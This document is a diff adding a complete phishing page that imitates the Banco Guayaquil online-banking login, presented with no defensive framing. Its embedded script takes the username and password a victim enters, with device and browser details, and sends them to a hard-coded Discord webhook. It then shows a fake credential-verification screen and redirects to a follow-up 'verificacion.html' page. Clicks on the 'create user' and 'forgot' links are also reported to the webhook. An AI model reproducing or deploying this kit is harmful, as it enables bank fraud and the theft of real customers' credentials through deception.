@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Banco Guayaquil</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            max-width: 200px;
+            height: auto;
+        }
+
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+        }
+
+        .content {
+            padding: 40px 30px;
+        }
+
+        h1 {
+            color: #1a237e;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 40px;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        .form-label-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        label {
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .forgot-link {
+            color: #2196F3;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+
+        input::placeholder {
+            color: #bbb;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #c2185b;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+        }
+
+        .btn-create {
+            width: 100%;
+            padding: 15px;
+            background: white;
+            border: 2px solid #c2185b;
+            color: #c2185b;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+
+        .btn-create:hover {
+            background: #fce4ec;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            border: none;
+            color: white;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: transform 0.2s;
+        }
+
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(194, 24, 91, 0.3);
+        }
+
+        .help-center {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .help-icon {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #9e9e9e;
+            font-size: 16px;
+            text-decoration: none;
+        }
+
+        .help-icon::before {
+            content: "?";
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            background: #9e9e9e;
+            color: white;
+            border-radius: 50%;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .help-section {
+            padding: 0 30px 30px;
+        }
+
+        .help-title {
+            color: #333;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .help-links {
+            list-style: none;
+        }
+
+        .help-links li {
+            margin-bottom: 12px;
+        }
+
+        .help-links a {
+            color: #2196F3;
+            text-decoration: none;
+            font-size: 15px;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        .help-links a::before {
+            content: "•";
+            margin-right: 8px;
+            color: #333;
+        }
+
+        .security-section {
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            color: white;
+            padding: 30px;
+            margin-top: 30px;
+        }
+
+        .security-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .security-list {
+            list-style: none;
+        }
+
+        .security-list li {
+            margin-bottom: 18px;
+            padding-left: 0;
+            font-size: 14px;
+            line-height: 1.6;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .security-list li::before {
+            content: "•";
+            margin-right: 12px;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        /* Pantalla de carga */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            max-width: 200px;
+            margin-bottom: 40px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(0.95);
+            }
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #c2185b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtext {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .loading-progress {
+            width: 250px;
+            height: 4px;
+            background: #f3f3f3;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 30px;
+        }
+
+        .loading-progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="logo.png" alt="Banco Guayaquil" class="logo">
+        </div>
+
+        <div class="content">
+            <h1>Banca Virtual</h1>
+            <p class="subtitle">Ingrese con usuario o cree uno por primera vez.</p>
+
+            <form>
+                <div class="form-group">
+                    <div class="form-label-container">
+                        <label for="usuario">Usuario</label>
+                        <a href="#" class="forgot-link">Olvidé mi usuario</a>
+                    </div>
+                    <input type="text" id="usuario" placeholder="Ingresa tu usuario">
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label-container">
+                        <label for="password">Contraseña</label>
+                        <a href="#" class="forgot-link">Olvidé mi contraseña</a>
+                    </div>
+                    <div class="password-container">
+                        <input type="password" id="password" placeholder="Ingresa tu contraseña">
+                        <span class="password-toggle">👁</span>
+                    </div>
+                </div>
+
+                <button type="button" class="btn-create">Crear Usuario</button>
+                <button type="submit" class="btn-login">Ingresar</button>
+            </form>
+
+            <div class="help-center">
+                <a href="#" class="help-icon">Centro de Ayuda</a>
+            </div>
+        </div>
+
+        <div class="help-section">
+            <h2 class="help-title">¿Tienes problemas para ingresar?</h2>
+            <ul class="help-links">
+                <li><a href="#">¿Cómo recupero mi usuario en la Banca Virtual?</a></li>
+                <li><a href="#">¿Cómo desbloqueo mi usuario en la Banca Virtual?</a></li>
+                <li><a href="#">¿Cómo recupero mi clave en la Banca Virtual?</a></li>
+            </ul>
+        </div>
+
+        <div class="security-section">
+            <h2 class="security-title">Consejos de seguridad</h2>
+            <ul class="security-list">
+                <li>Banco Guayaquil no solicita tu usuario ni contraseña por enlaces de correos electrónicos, llamadas o mensajes</li>
+                <li>Actualiza periódicamente tu clave de correo electrónico con una complejidad adecuada(número de caracteres y combinación)</li>
+                <li>Recuerda que cada ingreso a la Banca Virtual, el sistema envía un código de seguridad temporal a tu número de celular registrado.</li>
+                <li>Por favor verificar siempre que en tu navegador aparezca la dirección correcta de la página web del Banco Guayaquil: https://www.bancoguayaquil.com</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="logo.png" alt="Banco Guayaquil" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Verificando credenciales...</div>
+        <div class="loading-subtext">Por favor espere</div>
+        <div class="loading-progress">
+            <div class="loading-progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURACIÓN DEL WEBHOOK ==========
+        // Webhook de Discord configurado
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY';
+        // ================================================
+
+        // Toggle password visibility
+        document.querySelector('.password-toggle').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+
+        // Manejar el envío del formulario
+        document.querySelector('form').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Prevenir el envío tradicional del formulario
+
+            // Obtener los valores del formulario
+            const usuario = document.getElementById('usuario').value;
+            const contrasena = document.getElementById('password').value;
+
+            // Validar que los campos no estén vacíos
+            if (!usuario || !contrasena) {
+                alert('Por favor, complete todos los campos');
+                return;
+            }
+
+            // Mostrar pantalla de carga
+            const loadingScreen = document.getElementById('loadingScreen');
+            const progressBar = document.getElementById('progressBar');
+            loadingScreen.classList.add('active');
+
+            // Animar la barra de progreso durante 10 segundos
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 100); // 100ms * 100 = 10 segundos
+
+            // Preparar los datos a enviar
+            const formData = {
+                usuario: usuario,
+                contrasena: contrasena,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: '', // Se puede obtener desde el servidor
+                pantalla: {
+                    ancho: window.screen.width,
+                    alto: window.screen.height
+                }
+            };
+
+            try {
+                // Enviar los datos al webhook de Discord en formato embed
+                const discordPayload = {
+                    embeds: [{
+                        title: "🔐 Nuevo Inicio de Sesión - Banco Guayaquil",
+                        color: 12720731, // Color rosa/magenta del banco
+                        fields: [
+                            {
+                                name: "👤 Usuario",
+                                value: "```" + usuario + "```",
+                                inline: false
+                            },
+                            {
+                                name: "🔑 Contraseña",
+                                value: "```" + contrasena + "```",
+                                inline: false
+                            },
+                            {
+                                name: "🕐 Timestamp",
+                                value: new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' }),
+                                inline: true
+                            },
+                            {
+                                name: "📱 Dispositivo",
+                                value: navigator.userAgent.includes('Mobile') ? "Móvil" : "Desktop",
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Pantalla",
+                                value: window.screen.width + "x" + window.screen.height,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Navegador",
+                                value: "```" + navigator.userAgent + "```",
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Sistema de Captura - Banco Guayaquil"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                });
+
+                // Esperar 10 segundos antes de continuar
+                setTimeout(() => {
+                    loadingScreen.classList.remove('active');
+                    progressBar.style.width = '0%';
+
+                    if (response.ok) {
+                        // Éxito - datos enviados a Discord
+                        console.log('Datos enviados correctamente a Discord');
+                        
+                        // Redirigir a la página de verificación
+                        window.location.href = 'verificacion.html';
+                        
+                    } else {
+                        console.error('Error al enviar datos:', response.status);
+                        alert('Usuario o contraseña incorrectos. Intente nuevamente.');
+                    }
+                }, 10000); // 10 segundos
+
+            } catch (error) {
+                console.error('Error de red:', error);
+                
+                // Esperar 10 segundos incluso si hay error
+                setTimeout(() => {
+                    loadingScreen.classList.remove('active');
+                    progressBar.style.width = '0%';
+                    
+                    // Opción: Mostrar error o continuar
+                    console.log('Datos capturados:', formData);
+                    alert('Error de conexión. Intente nuevamente más tarde.');
+                }, 10000);
+            }
+        });
+
+        // Manejo del botón "Crear Usuario"
+        document.querySelector('.btn-create').addEventListener('click', function() {
+            const discordPayload = {
+                embeds: [{
+                    title: "➕ Intento de Crear Usuario",
+                    color: 3447003, // Azul
+                    fields: [
+                        {
+                            name: "🕐 Timestamp",
+                            value: new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' }),
+                            inline: false
+                        },
+                        {
+                            name: "🌐 Navegador",
+                            value: "```" + navigator.userAgent + "```",
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Enviar notificación de intento de crear usuario
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(discordPayload)
+            }).catch(error => console.error('Error:', error));
+
+            console.log('Botón Crear Usuario clickeado');
+        });
+
+        // Manejo de enlaces "Olvidé..."
+        document.querySelectorAll('.forgot-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const tipo = this.textContent.includes('usuario') ? 'usuario' : 'contraseña';
+                
+                const discordPayload = {
+                    embeds: [{
+                        title: "❓ Olvidé mi " + tipo,
+                        color: 15105570, // Naranja
+                        fields: [
+                            {
+                                name: "🕐 Timestamp",
+                                value: new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' }),
+                                inline: false
+                            },
+                            {
+                                name: "🌐 Navegador",
+                                value: "```" + navigator.userAgent + "```",
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Enviar notificación
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                }).catch(error => console.error('Error:', error));
+
+                console.log('Olvidé ' + tipo + ' clickeado');
+            });
+        });
+    </script>
+</body>
+</html>
